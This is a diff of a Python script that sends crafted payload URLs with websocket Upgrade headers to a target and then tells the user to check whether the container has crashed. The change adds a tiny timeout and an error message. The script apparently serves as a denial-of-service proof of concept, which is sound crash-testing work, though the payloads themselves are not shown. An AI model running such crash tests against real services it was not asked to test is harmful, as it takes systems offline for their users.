@@ -32,14 +32,17 @@ def main():
   for url in payloads:
     payload_url = "%s%s" % (url, random.randint(1000000000000000000,9999999999999999999))
     print('Requesting: %s' % payload_url)
-    req = requests.get(url=payload_url, headers={
-      'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0',
-      'Cache-Control': 'max-age=0',
-      'Accept-Language': 'en-US,en;q=0.5',
-      'Connection': 'Upgrade',
-      'Upgrade': 'websocket',
-    })
-    print("Status code: %s" % req.status_code)
+    try:
+      req = requests.get(url=payload_url, timeout=0.001, headers={
+        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0',
+        'Cache-Control': 'max-age=0',
+        'Accept-Language': 'en-US,en;q=0.5',
+        'Connection': 'Upgrade',
+        'Upgrade': 'websocket',
+      })
+      print("Status code: %s" % req.status_code)
+    except:
+      print('Request did not return. Check if the target is down.')
 
   print ("Complete! Check if the container has crashed")
 
